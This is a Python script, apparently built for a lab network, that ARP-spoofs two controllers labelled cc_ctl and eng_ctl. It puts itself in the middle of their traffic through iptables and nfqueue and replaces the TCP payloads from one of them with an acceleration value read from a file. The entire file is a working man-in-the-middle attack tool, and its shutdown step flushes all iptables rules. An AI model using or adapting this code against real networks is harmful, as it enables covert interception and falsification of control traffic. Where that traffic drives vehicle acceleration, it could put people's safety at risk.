#!/usr/bin/python2

"""
    Use scapy to modify packets going through your machine.
    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
    Reference: https://gist.github.com/eXenon/85a3eab09fefbb3bee5d
"""

import nfqueue
from scapy.all import *
import os
import time
import threading
import multiprocessing


def read_prefered_accel():
    if not os.path.exists("override_prefered_accel.txt"):
        return "+1.50"
    opened_file = open("override_prefered_accel.txt", 'r')
    line = opened_file.read()
    opened_file.close()
    value = float(line)
    return "%+.2f" % (value)


cc_ctl_IP = "10.0.0.1"
eng_ctl_IP = "10.0.0.2"
cc_ctl_MAC = "00:00:00:00:00:01"
eng_ctl_MAC = "00:00:00:00:00:02"

def start_spoof():
    print("Sending fake ARP packets ==")
    send(ARP(op = 1, pdst = cc_ctl_IP, psrc = eng_ctl_IP, hwdst = cc_ctl_MAC), verbose=False)
    send(ARP(op = 1, pdst = eng_ctl_IP, psrc = cc_ctl_IP, hwdst = eng_ctl_MAC), verbose=False)

def stop_spoof():
    for _ in range(3):
        print("Restore ARP cache ==")
        send(ARP(op = 1, pdst = cc_ctl_IP, psrc = eng_ctl_IP, hwdst = cc_ctl_MAC, hwsrc = eng_ctl_MAC), verbose=False)
        send(ARP(op = 1, pdst = eng_ctl_IP, psrc = cc_ctl_IP, hwdst = eng_ctl_MAC, hwsrc = cc_ctl_MAC), verbose=False)
        time.sleep(1)

def keep_spoof():
    while(True):
        time.sleep(1)
        start_spoof()

def setup_environments():
    # Enable IP forwarding
    print("Enable IP forwarding")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    time.sleep(0.5)
    # If you want to use it as a reverse proxy for your machine
    # iptablesr = "iptables -A OUTPUT -j NFQUEUE"
    # If you want to use it for MITM :
    iptablesr = "iptables -A FORWARD -j NFQUEUE"
    print("Adding iptable rules :")
    print(iptablesr)
    os.system(iptablesr)


def callback(i, payload):
    # Here is where the magic happens.
    data = payload.get_data()
    pkt = IP(data)
    # print("Got a packet ! source ip : " + str(pkt.src) + "I is" + str(i))
    # return
    # print("packet is %s" % pkt[TCP].payload)
    if (pkt.src == "10.0.0.1" and
        pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        # Modify payload
        print("Modify a pkt from source ip : " + str(pkt.src))
        # Read prefered-accel from file
        accel = read_prefered_accel()
        pkt[TCP].remove_payload()
        pkt[TCP].add_payload(Raw(str.encode(accel)))
        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
    else:
        # Pass-through
        payload.set_verdict(nfqueue.NF_ACCEPT)


def main():
    setup_environments()
    # Begin spoofing
    p = multiprocessing.Process(target=keep_spoof)
    p.start()

    # Intercept kernel packets
    # This is the intercept
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        q.try_run() # Main loop
    except KeyboardInterrupt:
        # Stop spoofing
        p.terminate()
        stop_spoof()
        # Unset kernel interception
        q.unbind(socket.AF_INET)
        q.close()
        print("Flushing iptables.")
        # This flushes everything
        os.system('iptables -F')
        os.system('iptables -X')
        # Unset forwarding
        print("Unset forwarding")
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print("END")

if __name__ == "__main__":
    main()